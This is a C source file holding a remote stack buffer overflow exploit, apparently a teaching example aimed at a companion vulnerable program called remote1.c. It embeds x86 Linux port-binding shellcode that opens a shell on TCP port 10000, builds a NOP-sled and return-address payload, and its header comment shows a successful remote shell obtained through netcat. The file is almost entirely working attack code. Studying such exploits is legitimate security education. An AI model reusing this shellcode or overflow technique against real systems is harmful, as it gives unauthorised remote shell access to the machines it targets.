/*
 * $Id: remote1-ex2.c,v 1.1.1.1 2004/05/29 14:15:05 raptor Exp $
 *
 * remote1-ex2.c - remote1.c exploit (remote exploitation)
 * Copyright (c) 2003 Marco Ivaldi <raptor@0xdeadbeef.info>
 *
 * Simple remote exploit example. Tested on Linux 2.4.20-rc4 and 2.4.21.
 *
 * raptor@karma:~/devel$ (./remote1-ex2; cat) | nc localhost 1234
 * Using ret: 0xbffffa60
 * my name is: 
 *
 * raptor@karma:~/devel$ nc localhost 10000
 * id
 * uid=3008(raptor) gid=1000(redazione) groups=1000(redazione)
 * uname -a
 * Linux karma 2.4.20-rc4 #1 SMP Wed Nov 27 19:21:06 CET 2002 i686 unknown
 * exit
 * raptor@karma:~/devel$ 
 */

#include <stdio.h>
#include <string.h>
#include <unistd.h>
#include <stdlib.h>

#define BUF	1065		// 1024 + 40 + 1
#define NOP	0x90		// nop padding
#define RET	0xbffffa60	// hardcoded value found during tests
#define ALIGN	2		// alignment

char sc[] = /* linux/x86 portbinding shellcode (88 bytes) */
"\x31\xdb\xf7\xe3\xb0\x66\x53\x43\x53\x43\x53\x89\xe1\x4b\xcd\x80"
"\x89\xc7\x52\x66\x68"
"\x27\x10" // port 10000/tcp, change if needed
"\x43\x66\x53\x89\xe1\xb0\x10\x50\x51\x57\x89\xe1\xb0\x66\xcd\x80"
"\xb0\x66\xb3\x04\xcd\x80"
"\x50\x50\x57\x89\xe1\x43\xb0\x66\xcd\x80"
"\x89\xd9\x89\xc3\xb0\x3f\x49\xcd\x80"
"\x41\xe2\xf8\x51\x68n/sh\x68//bi\x89\xe3\x51\x53\x89\xe1\xb0\x0b\xcd\x80";

int main(int argc, char *argv[])
{
	char buf[BUF];
	int i, n;
	int *p;

	fprintf(stderr, "Using ret: %p\n", RET);

	/* padding and alignment */
	memset(buf, 'A', BUF);
	p = (int *)(buf + ALIGN);

	/* fill the buffer with ret */
	for (i = 0; i < BUF - 1; i += 4)
		*p++ = RET;
	*p = 0x0;

	/* nop padding */
	for (i = 0; i < (BUF - 1) / 2; i++)
		buf[i] = NOP;

	/* place shellcode after the nops */
	for (n = 0; n < strlen(sc); n++)
		buf[i++] = sc[n];

	fprintf(stdout, "%s\r\n", buf);
	fflush(stdout);
}
